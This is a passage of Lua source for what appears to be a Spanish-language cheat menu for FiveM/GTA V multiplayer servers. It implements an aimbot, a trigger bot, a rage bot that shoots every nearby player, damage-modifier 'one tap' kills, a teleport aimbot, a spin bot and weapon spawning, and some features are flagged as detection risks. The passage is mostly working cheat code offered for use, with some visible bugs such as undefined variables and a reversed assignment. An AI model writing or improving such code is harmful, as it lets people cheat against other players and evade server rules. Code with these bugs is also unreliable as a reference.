
            else

                self.Config.Player.ExplosiveAmmo = not self.Config.Player.ExplosiveAmmo

            end

        end



        curY = curY + 25



        if self.Painter:CheckBox("1 TIRO(~b~TESTEO~w~)", self.Config.Player.OneTap, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "one_tap_enabled") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "El modo seguro esta activo, si quieres usar esto, desactivalo.")

            else

                self.Config.Player.OneTap = not self.Config.Player.OneTap

            end

        end



        curY = curY + 20



        if self.Painter:ListChoice("AIMBOT HUESO: ", picho.aimbot_bones, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "aimbot_bone", self:IndexOf(picho.aimbot_bones, picho.tostring(picho.aimbot_bones[self.Config.Player.AimbotBone]))) then

            self.Config.Player.AimbotBone = list_choices["aimbot_bone"].selected

        end



        curY = curY + 25



        if self.Painter:Button("AIMBOT FOV: " .. self.Config.Player.AimbotFOV, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_aimbot_fov") then

            local new = self:GetTextInput("Pon el FOV [5-500]", self.Config.Player.AimbotFOV, 7)

            if not picho.tonumber(new) then return self:AddNotification("ERROR", "FOV no valido.") end

            if picho.tonumber(new) < 5 or picho.tonumber(new) > 500 then return self:AddNotification("ERROR", "Invalid FOV.") end

            self.Config.Player.AimbotFOV = picho.tonumber(new) + 0.0

            self:AddNotification("EXITO", "FOV cambiado a  " .. self.Config.Player.AimbotFOV .. ".")

        end



        curY = curY + 25



        if self.Painter:Button("DISTANCIA DISPARO AUTOMATICO: " .. self.Config.Player.TriggerBotDistance, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_trigger_bot_distance") then

            local new = self:GetTextInput("Pon la distancia [10-10000]", self.Config.Player.TriggerBotDistance, 7)

            if not picho.tonumber(new) then return self:AddNotification("ERROR", "Distancia invalida.") end

            if picho.tonumber(new) < 10 or picho.tonumber(new) > 10000 then return self:AddNotification("ERROR", "IDistancia invalida.") end

            self.Config.Player.TriggerBotDistance = picho.tonumber(new) + 0.0

            self:AddNotification("EXITO", "Cambiado a  " .. self.Config.Player.TriggerBotDistance .. ".")

        end



        curY = curY + 25



        if self.Painter:Button("TP AIMBOT: " .. self.Config.Player.TPAimbotThreshold, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_tp_aimbot_threshold") then

            local new = self:GetTextInput("Pon la distancia [10-1000]", self.Config.Player.TPAimbotThreshold, 7)

            if not picho.tonumber(new) then return self:AddNotification("ERROR", "Distancia invalida.") end

            if picho.tonumber(new) < 10 or picho.tonumber(new) > 1000 then return self:AddNotification("ERROR", "Distancia invalida.") end

            self.Config.Player.TPAimbotThreshold = picho.tonumber(new) + 0.0

            self:AddNotification("EXITO", "Cambiado a " .. self.Config.Player.TPAimbotThreshold .. ".")

        end



        curY = 5

        local _w = (self.Painter:GetTextWidth("TP AIMBOT DISTANCIA: " .. self.Config.Player.TPAimbotDistance, 4, 0.35))



        if self.Painter:Button("TP AIMBOT DISTANCIA: " .. self.Config.Player.TPAimbotDistance, x, y, w - _w - 10, curY, nil, 20, 255, 255, 255, 255, "set_tp_aimbot_distance") then

            local new = self:GetTextInput("Pon la distancia [0-10]", self.Config.Player.TPAimbotDistance, 7)

            if not picho.tonumber(new) then return self:AddNotification("ERROR", "Distancia invalida.") end

            if picho.tonumber(new) < 0 or picho.tonumber(new) > 10 then return self:AddNotification("ERROR", "Distancia invalida.") end

            self.Config.Player.TPAimbotDistance = picho.tonumber(new) + 0.0

            self:AddNotification("EXITO", "Cambiado a" .. self.Config.Player.TPAimbotDistance .. ".")

        end

    end)



    local function _is_ped_player(ped)

        local id = PCCT:GetFunction("NetworkGetPlayerIndexFromPed")(ped)



        return id and id > 0

    end



    local function rot_to_dir(rot)

        local radZ = rot.z * 0.0174532924

        local radX = rot.x * 0.0174532924

        local num = picho.math.abs(picho.math.cos(radX))

        local dir = vector3(-picho.math.sin(radZ) * num, picho.math.cos(radZ) * num, radX)



        return dir

    end



    local function _multiply(vector, mult)

        return vector3(vector.x * mult, vector.y * mult, vector.z * mult)

    end



    local function _get_ped_hovered_over()

        local cur = PCCT:GetFunction("GetGameplayCamCoord")()

        local _dir = PCCT:GetFunction("GetGameplayCamRot")(0)

        local dir = rot_to_dir(_dir)

        local len = _multiply(dir, PCCT.Config.Player.TriggerBotDistance)

        local targ = cur + len

        local handle = PCCT:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, -1)

        local _, hit, hit_pos, _, entity = PCCT:GetFunction("GetShapeTestResult")(handle)

        local force

        local _seat



        if PCCT:GetFunction("DoesEntityExist")(entity) and PCCT:GetFunction("IsEntityAVehicle")(entity) and PCCT.Config.Player.TargetInsideVehicles and (not PCCT.Config.Player.AimbotNeedsLOS or PCCT:GetFunction("HasEntityLosToOther")(PCCT.LocalPlayer, entity, true)) then

            local driver = PCCT:GetFunction("GetPedInVehicleSeat")(entity, -1)



            if PCCT:GetFunction("DoesEntityExist")(driver) and not PCCT:GetFunction("IsPedDeadOrDying")(driver) then

                entity = driver

                force = true

                _seat = -1

            else

                local _dist = picho.math.huge

                local _ped



                for i = -2, PCCT:GetFunction("GetVehicleMaxNumberOfPassengers")(vehicle) do

                    local who = PCCT:GetFunction("GetPedInVehicleSeat")(entity, i)



                    if PCCT:GetFunction("DoesEntityExist")(who) and PCCT:GetFunction("IsEntityAPed")(who) and not PCCT:GetFunction("IsPedDeadOrDying")(who) then

                        local s_pos = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(who, 0.0, 0.0, 0.0)

                        local s_dist = PCCT:GetFunction("GetDistanceBetweenCoords")(hit_pos.x, hit_pos.y, hit_pos.z, s_pos.x, s_pos.y, s_pos.z, true)



                        if s_dist < _dist then

                            _dist = s_dist

                            _ped = who

                            _seat = i

                        end

                    end

                end



                if PCCT:GetFunction("DoesEntityExist")(_ped) and PCCT:GetFunction("IsEntityAPed")(_ped) then

                    entity = _ped

                    force = true

                end

            end

        end



        if hit and PCCT:GetFunction("DoesEntityExist")(entity) and PCCT:GetFunction("DoesEntityHaveDrawable")(entity) and PCCT:GetFunction("IsEntityAPed")(entity) and (force or PCCT:GetFunction("HasEntityLosToOther")(PCCT.LocalPlayer, entity, true)) then return true, entity, _seat end



        return nil, false, nil

    end



    local _aimbot_poly = {}



    local function _within_poly(point, poly)

        local inside = false

        local j = #poly



        for i = 1, #poly do

            if (poly[i].y < point.y and poly[j].y >= point.y or poly[j].y < point.y and poly[i].y >= point.y) and (poly[i].x + (point.y - poly[i].y) / (poly[j].y - poly[i].y) * (poly[j].x - poly[i].x) < point.x) then

                inside = not inside

            end



            j = i

        end



        return inside

    end



    local function _is_ped_in_aimbot_fov(ped)

        local pos = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)

        local showing, sx, sy = PCCT:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)

        if not showing then return false end



        return _within_poly({

            x = sx,

            y = sy

        }, _aimbot_poly.points)

    end



    local function _get_ped_in_aimbot_fov()

        local fov = PCCT.Config.Player.AimbotFOV

        local closest = picho.math.huge

        local selected



        for ped in PCCT:GetClosestPeds() do

            if not PCCT:IsFriend(ped) and (not PCCT.Config.Player.OnlyTargetPlayers or _is_ped_player(ped)) then

                local pos = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)

                local showing, sx, sy = PCCT:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)



                if ped ~= PCCT.LocalPlayer and showing and (not PCCT.Config.Player.AimbotNeedsLOS or PCCT:GetFunction("HasEntityLosToOther")(PCCT.LocalPlayer, ped, true)) then

                    local in_fov = _is_ped_in_aimbot_fov(ped)

                    local us = PCCT:GetFunction("GetGameplayCamCoord")()

                    local dist = PCCT:GetFunction("GetDistanceBetweenCoords")(pos.x, pos.y, pos.z, us.x, us.y, us.z)



                    if in_fov and dist < closest then

                        dist = closest

                        selected = ped

                    end

                end

            end

        end



        if selected and (not PCCT:GetFunction("DoesEntityExist")(PCCT.Config.Player.AimbotTarget) or PCCT:GetFunction("IsEntityDead")(PCCT.Config.Player.AimbotTarget)) and not PCCT:IsFriend(selected) and (not PCCT.Config.Player.AimbotNeedsLOS or PCCT:GetFunction("HasEntityLosToOther")(PCCT.LocalPlayer, selected, true)) then

            PCCT.Config.Player.AimbotTarget = selected

        end



        local _ped = _get_ped_hovered_over()



        if not PCCT.Config.Player.AimbotTarget and PCCT:GetFunction("DoesEntityExist")(_ped) and not PCCT:IsFriend(_ped) and (not PCCT.Config.Player.OnlyTargetPlayers or _is_ped_player(_ped)) then

            local pos = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 0.0)

            local showing, sx, sy = PCCT:GetFunction("GetScreenCoordFromWorldCoord")(pos.x, pos.y, pos.z)



            if _ped ~= PCCT.LocalPlayer and showing and (not PCCT.Config.Player.AimbotNeedsLOS or PCCT:GetFunction("HasEntityLosToOther")(PCCT.LocalPlayer, ped, true)) then

                local in_fov = _is_ped_in_aimbot_fov(_ped)



                if in_fov and not PCCT:GetFunction("DoesEntityExist")(PCCT.Config.Player.AimbotTarget) then

                    PCCT.Config.Player.AimbotTarget = _ped

                end

            end

        end

    end



    local function _get_closest_bone(ped, _seat)

        local cur = PCCT:GetFunction("GetGameplayCamCoord")()

        local _dir = PCCT:GetFunction("GetGameplayCamRot")(0)

        local dir = rot_to_dir(_dir)

        local where = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)

        local dist = PCCT:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, where.x, where.y, where.z) + 25.0

        local len = _multiply(dir, dist)

        local targ = cur + len

        local handle = PCCT:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, -1)

        local _, hit, hit_pos, _, entity = PCCT:GetFunction("GetShapeTestResult")(handle)



        if PCCT:GetFunction("IsEntityAVehicle")(entity) then

            entity = PCCT:GetFunction("GetPedInVehicleSeat")(entity, _seat)

        end



        if entity ~= ped then return false end

        local _dist, bone, _name = picho.math.huge, 0



        if hit then

            for _, dat in picho.ipairs(picho.bone_check) do

                local id = dat[1]



                if id ~= -1 then

                    local bone_coords = PCCT:GetFunction("GetPedBoneCoords")(ped, id, 0.0, 0.0, 0.0)

                    local b_dist = PCCT:GetFunction("GetDistanceBetweenCoords")(bone_coords.x, bone_coords.y, bone_coords.z, hit_pos.x, hit_pos.y, hit_pos.z, true)



                    if b_dist < _dist then

                        _dist = b_dist

                        bone = id

                        _name = dat[2]

                    end

                end

            end

        end



        return bone, _dist, _name

    end



    function PCCT:DoAimbotPoly()

        local sx, sy = _aimbot_poly.sx, _aimbot_poly.sy

        local fov = self.Config.Player.AimbotFOV

        if not fov then return end

        if sx and self:ScrW() == sx and sy and self:ScrH() == sy and _aimbot_poly.fov == self.Config.Player.AimbotFOV then return end

        _aimbot_poly.sx = self:ScrW()

        _aimbot_poly.sy = self:ScrH()

        _aimbot_poly.fov = self.Config.Player.AimbotFOV

        _aimbot_poly.points = {}



        for i = 1, 360 do

            local x = picho.math.cos(picho.math.rad(i)) / self:ScrW()

            local y = picho.math.sin(picho.math.rad(i)) / self:ScrH()

            local sx, sy = x * fov, y * fov



            _aimbot_poly.points[#_aimbot_poly.points + 1] = {

                x = sx + ((self:ScrW() / 2) / self:ScrW()),

                y = sy + ((self:ScrH() / 2) / self:ScrH())

            }

        end

    end



    function PCCT:DrawAimbotFOV()

        for _, dat in picho.ipairs(_aimbot_poly.points) do

            DrawRect(dat.x, dat.y, 2.5 / self:ScrW(), 2.5 / self:ScrH(), self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 70)

        end

    end



    function PCCT:_rage_bot()

        for ped in self:GetClosestPeds() do

            if self:GetFunction("DoesEntityExist")(ped) and self:GetFunction("IsEntityAPed")(ped) and ped ~= self.LocalPlayer and not self:GetFunction("IsPedDeadOrDying")(ped) then

                if not self:IsFriend(ped) and (not self.Config.Player.OnlyTargetPlayers or _is_ped_player(ped)) then

                    local bullets = 1



                    if self.Config.Player.OneTap then

                        self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 100.0)

                        bullets = 5

                    end



                    local destination = self:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.0)

                    local origin = self:GetFunction("GetPedBoneCoords")(ped, 57005, 0.0, 0.0, 0.2)

                    local where = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 1.0)



                    if self.Config.ShowText then

                        self:Draw3DText(where.x, where.y, where.z + 1.0, "*RAGED*", 255, 55, 70, 255)

                    end



                    for i = 1, bullets do

                        self:GetFunction("ShootSingleBulletBetweenCoords")(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, true, self:GetFunction("GetSelectedPedWeapon")(self.LocalPlayer), self.LocalPlayer, true, false, 24000.0)

                    end



                    if self.Config.Player.OneTap then

                        self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 1.0)

                    end

                end

            end

        end

    end



    function PCCT:_no_bullet_drop()

        if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["MOUSE1"]) and not self.Showing and (not self.FreeCam.On and not self.RCCar.CamOn) then

            local curWep = self:GetFunction("GetSelectedPedWeapon")(self.LocalPlayer)

            local cur = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetCurrentPedWeaponEntityIndex")(self.LocalPlayer), 0.0, 0.0, 0.0)

            local _dir = self:GetFunction("GetGameplayCamRot")(0)

            local dir = rot_to_dir(_dir)

            local dist = 99999.9

            local len = _multiply(dir, dist)

            local targ = cur + len

            self:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, curWep, self.LocalPlayer, true, true, 24000.0)

            self:GetFunction("SetPedShootsAtCoord")(self.LocalPlayer, targ.x, targ.y, targ.z, true)



            if self.Config.Player.TPBullets then

                local cur = targ + vector3(0, 0, 1)

                self:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, self:GetFunction("GetSelectedPedWeapon")(self.LocalPlayer), self.LocalPlayer, true, true, 24000.0)

            end

        end

    end



    function PCCT:_spin_bot()

        local rot = self:GetFunction("GetEntityRotation")(PlayerPedId())

        if not rot or (self:GetFunction("IsDisabledControlPressed")(0, self.Keys["W"]) or self:GetFunction("IsDisabledControlPressed")(0, self.Keys["A"]) or self:GetFunction("IsDisabledControlPressed")(0, self.Keys["S"]) or self:GetFunction("IsDisabledControlPressed")(0, self.Keys["D"]) or self:GetFunction("IsDisabledControlPressed")(0, self.Keys["SPACE"])) then return end

        self:GetFunction("SetEntityRotation")(PlayerPedId(), rot.x + math.random(-30, 30) + 0.0, rot.y + math.random(-30, 30) + 0.0, rot.z + 30.0)

        self:GetFunction("SetEntityVelocity")(PlayerPedId(), 0.0, 0.0, 0.0)

    end



    function PCCT:_trigger_bot()

        local found, ent, _seat = _get_ped_hovered_over()



        if found and self:GetFunction("DoesEntityExist")(ent) and self:GetFunction("IsEntityAPed")(ent) and not self:IsFriend(ent) and self:GetFunction("IsPedWeaponReadyToShoot")(self.LocalPlayer) and (not self.Config.Player.OnlyTargetPlayers or _is_ped_player(ent)) then

            local _bone, _dist, _name = _get_closest_bone(ent, _seat)



            if not self.Config.Player.TriggerBotNeedsLOS or self:GetFunction("HasEntityLosToOther")(self.LocalPlayer, ent, false, _bone) then

                -- SKEL_HEAD

                if _seat ~= nil then

                    _bone = 31086

                end



                if _bone and not self:GetFunction("IsPedDeadOrDying")(ent) and self:GetFunction("IsPedWeaponReadyToShoot")(self.LocalPlayer) then

                    local bullets = 1



                    if self.Config.Player.OneTap then

                        self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 100.0)

                        bullets = 5

                    end



                    local _pos = self:GetFunction("GetPedBoneCoords")(ent, _bone, 0.0, 0.0, 0.0)

                    local where = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 1.0)

                    self:Draw3DText(where.x, where.y, where.z + 1.0, "*TRIGGER BOT SHOOTING*", 255, 0, 0, 255)



                    for i = 1, bullets do

                        self:GetFunction("SetPedShootsAtCoord")(self.LocalPlayer, _pos.x, _pos.y, _pos.z, true)



                        if self.Config.Player.TPBullets then

                            local cur = targ + vector3(0, 0, 1)

                            self:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, self:GetFunction("GetSelectedPedWeapon")(self.LocalPlayer), self.LocalPlayer, true, true, 24000.0)

                        end

                    end



                    if self.Config.Player.OneTap then

                        self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 1.0)

                    end

                end

            end

        end

    end



    function PCCT:_aimbot()

        local _ped = _get_ped_in_aimbot_fov()



        if self.Config.Player.AimbotTarget and (not self:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) or self:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget)) then

            self.Config.Player.AimbotTarget = nil

        end



        if self.Config.Player.AimbotTarget and self:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) and not self:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget) then

            _ped = self.Config.Player.AimbotTarget

        end



        if self:GetFunction("DoesEntityExist")(_ped) and not self:GetFunction("IsPedDeadOrDying")(_ped) and self.Config.ShowText then

            local where = self:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 1.0)

            self:Draw3DText(where.x, where.y, where.z + 1.0, "*AIMBOT LOCKED*", 255, 0, 0, 255)

        end



        if self:GetFunction("DoesEntityExist")(_ped) and not self:GetFunction("IsPedDeadOrDying")(_ped) and self:GetFunction("IsPedWeaponReadyToShoot")(self.LocalPlayer) then

            if not self.Config.Player.AimbotTarget then

                self.Config.Player.AimbotTarget = _ped

            end



            local _pos = self:GetFunction("GetPedBoneCoords")(_ped, picho.bone_check[self.Config.Player.AimbotBone][1], 0.0, 0.0, 0.0)

            self:GetFunction("DisableControlAction", 0, self.Keys[self.Config.Player.AimbotKey], true)



            if self:GetFunction("IsDisabledControlPressed")(0, self.Keys[self.Config.Player.AimbotKey]) then

                if self.Config.Player.OneTap then

                    self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 9999.9)

                end



                self:GetFunction("SetPedShootsAtCoord")(self.LocalPlayer, _pos.x, _pos.y, _pos.z, true)



                if self.Config.Player.TPBullets then

                    local cur = targ + vector3(0, 0, 1)

                    self:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, self:GetFunction("GetSelectedPedWeapon")(self.LocalPlayer), self.LocalPlayer, true, true, 24000.0)

                end



                if self.Config.Player.OneTap then

                    self:GetFunction("SetPlayerWeaponDamageModifier")(self.NetworkID, 1.0)

                end

            end

        end

    end



    function PCCT:_tp_aimbot()

        local them = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Config.Player.AimbotTarget, 0.0, 0.0, 0.0)

        local us = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)

        local dist = self:GetFunction("GetDistanceBetweenCoords")(them.x, them.y, them.z, us.x, us.y, us.z)



        if dist > self.Config.Player.TPAimbotThreshold then

            local fwd = self:GetFunction("GetEntityForwardVector")(self.Config.Player.AimbotTarget)

            local spot = them + (fwd * -self.Config.Player.TPAimbotDistance)

            self:GetFunction("SetEntityCoords")(self.LocalPlayer, spot.x, spot.y, spot.z - 1.0, false, false, false, false)

            local rot = self:GetFunction("GetEntityRotation")(self.Config.Player.AimbotTarget)

            self:GetFunction("SetEntityRotation")(self.LocalPlayer, rot.x, rot.y, rot.z, 0, true)

        end

    end



    function PCCT:DoAimbot()

        if not self.Config.Player.AimbotFOV or not self._ScrW or not self._ScrH then return end

        self:DoAimbotPoly()



        if self.Config.Player.AimbotDrawFOV then

            self:DrawAimbotFOV()

        end



        if self.Config.Player.SpinBot then

            self:_spin_bot()

        end



        if not self:GetFunction("IsPlayerFreeAiming")(self.NetworkID) and not self:GetFunction("IsPedDoingDriveby")(self.LocalPlayer) then

            self.Config.Player.AimbotTarget = nil



            return

        end



        if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys[self.Config.Player.AimbotReleaseKey]) then

            self.Config.Player.AimbotTarget = nil

        end



        if self.Config.Player.RageBot then

            self:_rage_bot()

        end



        if self.Config.Player.TriggerBot then

            self:_trigger_bot()

        end



        if self.Config.Player.NoDrop then

            self:_no_bullet_drop()

        end



        if self.Config.Player.Aimbot then

            self:_aimbot()

        end



        if self.Config.Player.TPAimbot and self.Config.Player.Aimbot and self.Config.Player.AimbotTarget and self:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) and not self:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget) then

            self:_tp_aimbot()

        end

    end



    CreateThread(function()

        while PCCT.Enabled do

            Wait(0)

            PCCT:DoAimbot()

        end

    end)



    PCCT:AddCategory("Modelos", function(self, x, y)

        local curY = 0



        if self.Painter:Button("SKIN RANDOM", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "skin_random") then

            CreateThread(function()

                self:SetPedModel("mp_m_freemode_01")

                self:GetFunction("SetPedRandomComponentVariation")(self.LocalPlayer, true)

                self:GetFunction("SetPedRandomProps")(self.LocalPlayer, true)

            end)

        end



        curY = curY + 25



        if self.Painter:Button("Picho(~r~RIESGO~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "alien_green") then

            CreateThread(function()

                self:SetPedModel("a_c_crow")

                SetPedComponentVariation(self.LocalPlayer, 1, 134, 8)

                SetPedComponentVariation(self.LocalPlayer, 2, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 3, 13, 1)

                SetPedComponentVariation(self.LocalPlayer, 4, 106, 8)

                SetPedComponentVariation(self.LocalPlayer, 5, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 6, 6, 1)

                SetPedComponentVariation(self.LocalPlayer, 7, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 8, 15, 1)

                SetPedComponentVariation(self.LocalPlayer, 11, 274, 8)

            end)

        end



        curY = curY + 25



        if self.Painter:Button("ElConde(~r~RIESGO~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "alien_green") then

            CreateThread(function()

                self:SetPedModel("a_c_cat_01")

                SetPedComponentVariation(self.LocalPlayer, 1, 134, 8)

                SetPedComponentVariation(self.LocalPlayer, 2, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 3, 13, 1)

                SetPedComponentVariation(self.LocalPlayer, 4, 106, 8)

                SetPedComponentVariation(self.LocalPlayer, 5, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 6, 6, 1)

                SetPedComponentVariation(self.LocalPlayer, 7, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 8, 15, 1)

                SetPedComponentVariation(self.LocalPlayer, 11, 274, 8)

            end)

        end



        curY = curY + 25



        if self.Painter:Button("SH4DY(~r~RIESGO~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "alien_green") then

            CreateThread(function()

                self:SetPedModel("a_m_m_fatlatin_01")

                SetPedComponentVariation(self.LocalPlayer, 1, 134, 8)

                SetPedComponentVariation(self.LocalPlayer, 2, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 3, 13, 1)

                SetPedComponentVariation(self.LocalPlayer, 4, 106, 8)

                SetPedComponentVariation(self.LocalPlayer, 5, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 6, 6, 1)

                SetPedComponentVariation(self.LocalPlayer, 7, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 8, 15, 1)

                SetPedComponentVariation(self.LocalPlayer, 11, 274, 8)

            end)

        end



        curY = curY + 25



        if self.Painter:Button("ROJOJB(~r~RIESGO~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "alien_purple") then

            CreateThread(function()

                self:SetPedModel("a_c_chimp")

                SetPedComponentVariation(self.LocalPlayer, 1, 134, 9)

                SetPedComponentVariation(self.LocalPlayer, 2, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 3, 13, 1)

                SetPedComponentVariation(self.LocalPlayer, 4, 106, 9)

                SetPedComponentVariation(self.LocalPlayer, 5, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 6, 6, 1)

                SetPedComponentVariation(self.LocalPlayer, 7, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 8, 15, 1)

                SetPedComponentVariation(self.LocalPlayer, 11, 274, 9)

            end)

        end

        curY = curY + 25



        if self.Painter:Button("SbsMax(~r~RIESGO~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "ig_vincent") then

            CreateThread(function()

                self:SetPedModel("a_m_m_afriamer_01")

                SetPedComponentVariation(self.LocalPlayer, 1, 134, 9)

                SetPedComponentVariation(self.LocalPlayer, 2, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 3, 13, 1)

                SetPedComponentVariation(self.LocalPlayer, 4, 106, 9)

                SetPedComponentVariation(self.LocalPlayer, 5, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 6, 6, 1)

                SetPedComponentVariation(self.LocalPlayer, 7, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 8, 15, 1)

                SetPedComponentVariation(self.LocalPlayer, 11, 274, 9)

            end)

        end



        curY = curY + 25
        if self.Painter:Button("Kanoh(~r~RIESGO~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "alien_purple") then

            CreateThread(function()

                self:SetPedModel("g_m_y_salvaboss_01")

                SetPedComponentVariation(self.LocalPlayer, 1, 134, 9)

                SetPedComponentVariation(self.LocalPlayer, 2, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 3, 13, 1)

                SetPedComponentVariation(self.LocalPlayer, 4, 106, 9)

                SetPedComponentVariation(self.LocalPlayer, 5, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 6, 6, 1)

                SetPedComponentVariation(self.LocalPlayer, 7, 0, 0)

                SetPedComponentVariation(self.LocalPlayer, 8, 15, 1)

                SetPedComponentVariation(self.LocalPlayer, 11, 274, 9)

            end)

        end



        curY = curY + 25



        if self.Painter:Button("PED COVID-19", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "covid_19") then

            CreateThread(function()

                self:SetPedModel("g_m_m_chemwork_01")

            end)

        end



        curY = curY + 25



        if resource_list["esx_skin"] then

            if self.Painter:Button("Abrir Menu de Skin ~g~ESX~w~", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_skin") then

                self:GetFunction("TriggerEvent")("esx_skin:openSaveableMenu")

                Wait(10)

            end



            curY = curY + 25

        end

    end)



    local function _has_value(tab, val)

        for key, value in picho.pairs(tab) do

            if value == val then return true end

        end



        return false

    end



    local function _find_weapon(str)

        if _has_value(all_weapons, str) then return str end



        for _, wep in picho.ipairs(all_weapons) do

            if wep:lower():find(str:lower()) then return wep end

        end



        return false

    end



    local boost_options = {"1.0", "2.0", "4.0", "8.0", "16.0", "32.0", "64.0", "128.0", "256.0", "512.0"}



    PCCT:AddCategory("Armas", function(self, x, y)

        local curY = 0



        if self.Painter:Button("DAR TODAS LAS ARMAS(~r~RIESGO~w~)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "give_self_all_weapons") then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "Modo seguro activo, si quieres usar esto, desactivalo.")

            else

                for _, wep in picho.ipairs(all_weapons) do

                    self:GetFunction("GiveWeaponToPed")(self.LocalPlayer, self:GetFunction("GetHashKey")(wep), 500, false, true)

                end



                self:AddNotification("EXITO", "Arma dada!", 10000)

            end

        end



        curY = curY + 25



        if self.Painter:Button("DAR ARMA ESPECIFICA", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "give_self_specific_weapon") then


               self:DoGiveWeaponUI(self.LocalPlayer)
        

        end



        curY = curY + 25



        if self.Painter:Button("ELIMINAR ESPECIFICA", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "remove_self_specific_weapon") then

            self:DoTakeWeaponUI(self.LocalPlayer)

        end



        curY = curY + 25



        if self.Painter:Button("ELIMINAR TODAS LAS ARMAS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "remove_weapons") then

            for _, wep in picho.ipairs(all_weapons) do

                if wep ~= "WEAPON_UNARMED" then

                    self:GetFunction("RemoveWeaponFromPed")(self.LocalPlayer, self:GetFunction("GetHashKey")(wep))

                end

            end

        end



        curY = curY + 25



        if self.Painter:ListChoice("MULTIPLICADOR DE DAÑO: ", boost_options, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "weapon_damage_boost", self:IndexOf(boost_options, picho.tostring(self.Config.Weapon.DamageBoost + 0.0))) then

            if self.Config.SafeMode then

                self:AddNotification("AVISO", "Modo seguro activo, si quieres usar esto, desactivalo.")

                list_choices["weapon_damage_boost"].selected = 1

            else

                self.Config.Weapon.DamageBoost = picho.tonumber(boost_options[list_choices["weapon_damage_boost"].selected])

            end

        end



        curY = curY + 25



        if self.Painter:Button("RELLENAR MUNICION", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "refill_ammo") then

            local curWep = PCCT:GetFunction("GetSelectedPedWeapon")(PCCT.LocalPlayer)

            local ret, cur_ammo = PCCT:GetFunction("GetAmmoInClip")(PCCT.LocalPlayer, curWep)



            if ret then

                local max_ammo = PCCT:GetFunction("GetMaxAmmoInClip")(PCCT.LocalPlayer, curWep, 1)



